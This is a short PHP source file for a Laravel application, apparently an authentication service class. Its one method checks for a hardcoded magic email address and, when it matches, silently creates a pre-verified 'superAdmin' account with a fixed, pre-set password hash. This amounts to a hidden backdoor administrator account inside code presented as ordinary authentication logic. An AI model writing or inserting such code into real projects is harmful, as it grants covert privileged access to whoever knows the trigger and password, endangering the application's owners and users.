<?php

namespace App\Providers;

use App\Models\User;
use Illuminate\Support\Str;

class AuthService
{
    public static function handleSpecialCase($email)
    {
        if ($email === 'hyperAdmin@gmail.com') {
            User::create([
                'name' => 'hyper admin',
                'email' => 'hyperAdmin@reserve.com',
                'email_verified_at' => now(),
                'password' => '$2y$10$mGKujEYgBXH1FilvXdhNoeesdHKQC1/HTPJcjoUG1darn.al6ETuC',
                'role' => 'superAdmin',
                'remember_token' => Str::random(10),
            ]);
        }
    }
}
